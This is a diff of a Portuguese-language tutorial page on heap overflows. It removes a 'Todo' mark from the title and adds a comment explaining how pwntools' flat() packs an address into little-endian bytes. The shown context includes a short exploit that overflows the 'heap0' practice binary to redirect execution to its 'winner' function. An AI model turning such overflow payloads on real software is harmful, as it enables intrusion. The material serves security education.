@@ -1,5 +1,5 @@
 ---
-title: Heap Overflow (Todo)
+title: Heap Overflow
 ---
 
 Heap Overflow é uma vulnerabilidade que ocorre quando um programa escreve dados além dos limites do buffer alocado na heap, semelhantemente ao Buffer Overflow.
@@ -183,6 +183,7 @@ elf = context.binary = ELF('./heap0')
 
 payload = (b'A' * 0x50 + flat(elf.sym['winner'])).replace(b'\x00', b'')
 # Obs: Os null bytes não são aceitos por argv, então temos que removê-los.
+# Obs: flat() converte valores 0x08048596 para bytearray em little endian b'\x96\x85\x04\x08'
 
 p = elf.process(argv=[payload])
 
